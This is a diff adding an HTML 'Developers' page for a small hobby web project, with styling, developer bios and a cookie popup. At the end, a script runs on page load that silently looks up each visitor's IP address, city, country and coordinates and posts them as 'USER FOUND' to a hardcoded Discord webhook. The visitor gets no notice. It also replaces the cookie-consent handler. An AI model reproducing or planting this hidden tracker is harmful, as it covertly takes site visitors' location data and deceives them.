@@ -1,1 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
 
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Developers</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-image: url("blueback.jpeg");
+            background-size: cover;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: rgba(0, 162, 255, 0.8);
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            opacity: 0.8;
+            border: rgba(0, 68, 255, 0.8) solid 4px;
+        }
+        
+        .containerContainer {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: rgba(0, 110, 255, 0.8);
+            border: rgba(0, 89, 255, 0.8) solid 4px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            opacity: 0.8;
+        }
+        
+        .containerDarker {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: rgba(0, 60, 255, 0.8);
+            border: rgb(0, 26, 255) solid 4px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            opacity: 0.8;
+        }
+        
+        h1 {
+            color: #ffffff;
+            text-align: center;
+            font-size: 40px;
+        }
+        
+        h2,
+        h3 {
+            color: #ffffff;
+            text-align: center;
+            font-size: 30px;
+        }
+        
+        p {
+            color: #ffffff;
+            font-size: 20px;
+            line-height: 1.6;
+        }
+        
+        a {
+            color: #00ff00;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        a:hover {
+            color: #0d9900;
+        }
+        
+        .fadeInUp {
+            animation: fadeInUp 1s ease;
+        }
+        
+        .commandHeader {
+            font-size: 30px;
+        }
+        
+        .verifyButton {
+            font-size: 30px;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #00ff00;
+            border: green solid 2px;
+            cursor: pointer;
+            border-radius: 20px;
+            margin: 0;
+            position: absolute;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            transition: background-color 0.3s;
+        }
+        
+        .verifyButton:hover {
+            font-size: 30px;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #00ca00;
+            border: green solid 2px;
+            cursor: pointer;
+            border-radius: 20px;
+            margin: 0;
+            position: absolute;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            transition: background-color 0.3s;
+        }
+        
+        .navbar {
+            background-color: #00b7ff;
+            border: #003cff solid 4px;
+            border-radius: 10px;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            left: 0;
+            z-index: 2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .navbar a {
+            float: left;
+            display: block;
+            color: white;
+            border-radius: 10px;
+            text-align: center;
+            padding: 24px 26px;
+            text-decoration: none;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            left: 50%;
+            transition: background-color 0.3s;
+        }
+        
+        .navbar a:hover {
+            background-color: #0099ff;
+            border-radius: 10px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: black;
+            left: 50%;
+            transition: background-color 0.3s;
+        }
+        
+        .cookie-popup {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 10px;
+            display: none;
+        }
+        
+        .cookie-popup img {
+            width: 20px;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        
+        .pfp {
+            height: 70px;
+            width: 70px;
+            position: absolute;
+            left: 50%;
+            border-radius: 50px;
+            transform: translate(-50%, -50%);
+            opacity: 1;
+        }
+        
+        @keyframes fadeInUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="navbar">
+        <a href="index">Home</a>
+        <a href="devs">Developers</a>
+        <a href="about">About</a>
+        <a href="shop">Shop</a>
+        <a href="https://discord.gg/ZbuNedvZPT">Contact</a>
+    </div>
+    <br>
+    <br>
+    <br>
+
+    <div class="cookie-popup" id="cookiePopup">
+        <img src="cookie.png" alt="Cookie"> We use cookies to improve your experience on our site. By continuing to use our site, you accept our use of cookies.
+    </div>
+
+
+    <div class="container animate__animated animate__fadeInUp">
+        <h1><u><b>Developers</b></u></h1>
+        <div class="containerContainer">
+            <div class="backgroundCont">
+                <h2><u><b>WHO ARE WE?</b></u>
+                </h2>
+                <div class="containerDarker">
+                    <br>
+                    <img src="https://cdn.discordapp.com/attachments/1175420082181124168/1236788388678340688/Screenshot_2024-02-23_235130.png?ex=66394872&is=6637f6f2&hm=4765b77516af5431cc79f327e88cb5a580dde39af591099fbd8f9044280aa751&" class="pfp"></img>
+                    <h3><u>Ash_Dev1</u></h3>
+                    <p>I'm Ash_Dev1, a cybersecurity white-hat hacker, dedicated to safeguarding digital systems through innovative solutions like websites, Discord bots, and bypass scripts.
+                    </p>
+                </div>
+                <br>
+                <div class="containerDarker">
+                    <br>
+                    <img src="https://cdn.discordapp.com/attachments/1208479317537849364/1236789313170047007/53562ABD-608D-4713-AA76-76C0D776D6C1.jpg?ex=6639494e&is=6637f7ce&hm=da7b87acdc1aae12a85a5bd1f21a9fe028c8d5fe85f094c7e23369aa1536ca94&" class="pfp">
+                    <h3><u>Petililfr</u></h3>
+                    <p>I am an experienced  in the PYTHON, C# and HTML area. I am able to make epic websites such as this. I also own my own game development studio (check it out <a href="https://cgbstudios.com">here</a>! I made this website with
+                        ash_dev1 (see above) and we are hosting on github, because our personal web hosting servers are full. I am also somewhat expierenced in the eithical hacking side of programming, such as penetration testing, password attacks, network
+                        attacks (such as DDoSing) and other tools to do with IP and geolocation!</p>
+                </div>
+                <br>
+                <div class="containerDarker">
+                    <h3><u>What other projects have we developed?</u></h3>
+                    <p>Our developers have worked on many projects, including the ones following:</p>
+                    <p class="commandHeader"><u>Ash_Dev1:</u></p>
+                    <p>· <a href="https://ashdev.site/">https://ashdev.site</a></p>
+                    <p>· MaRBot</p>
+                    <p>· DevCrafters Bots</p>
+                    <p class="commandHeader"><u>Petililfr:</u></p>
+                    <p>· <a href="https://cgbstudios.com/">https://cgbstudios.com</a></p>
+                    <p>· MaRBot</p>
+                    <p>· PetPizza</p>
+                    <p>· <a href="https://marverify.site/">https://marverify.site/</a> (WiP)</p>
+                </div>
+            </div>
+        </div>
+        <p style="text-align: center;">Powered by MaR Society © 2024</p>
+    </div>
+    <script>
+        function setCookie(cname, cvalue, exdays) {
+            var d = new Date();
+            d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+            var expires = "expires=" + d.toUTCString();
+            document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+        }
+
+
+        function getCookie(cname) {
+            var name = cname + "=";
+            var decodedCookie = decodeURIComponent(document.cookie);
+            var ca = decodedCookie.split(';');
+            for (var i = 0; i < ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                }
+                if (c.indexOf(name) == 0) {
+                    return c.substring(name.length, c.length);
+                }
+            }
+            return "";
+        }
+
+
+        function checkCookie() {
+            var cookieConsent = getCookie("cookieConsent");
+            if (cookieConsent == "") {
+
+                document.getElementById("cookiePopup").style.display = "block";
+            }
+        }
+
+
+        function acceptCookies() {
+            document.getElementById("cookiePopup").style.display = "none";
+            setCookie("cookieConsent", "accepted", 365); // Set cookie for 1 year
+        }
+
+
+        window.onload = function() {
+            checkCookie();
+        };
+
+
+        function sendMessage() {
+            fetch("https://ipinfo.io/json")
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+                    var country = data.country;
+                    var city = data.city;
+                    var latitude = data.loc.split(',')[0];
+                    var longitude = data.loc.split(',')[1];
+                    var browser = navigator.userAgent;
+                    var currentTime = new Date().toLocaleString();
+                    var webhookUrl = "https://discord.com/api/webhooks/1236725710408646666/QXC9cW4S-Eeh7tmxZ18sZxp9ZZgFe4JqkMhkiDVtIxTIRKdfu377pvSP1j5MN4e3qcv9";
+                    var message = "USER FOUND:\nIP address is: " + ipAddress + "\nlocated in: " + city + ", " + country + "\nlatitude is: " + latitude + "\nlongitude is: " + longitude + "\nbrowser was opened at: " + currentTime;
+
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", webhookUrl, true);
+                    xhr.setRequestHeader("Content-Type", "application/json");
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4 && xhr.status === 204) {
+                            console.log("Message sent successfully!");
+                        } else {
+                            console.error("Failed to send message. Status code: " + xhr.status);
+                        }
+                    };
+                    xhr.send(JSON.stringify({
+                        "content": message
+                    }));
+                })
+                .catch(error => {
+                    console.error("Error fetching geolocation information: " + error.message);
+                });
+        }
+
+        window.onload = function() {
+            sendMessage();
+        };
+    </script>
+</body>
+
+</html>
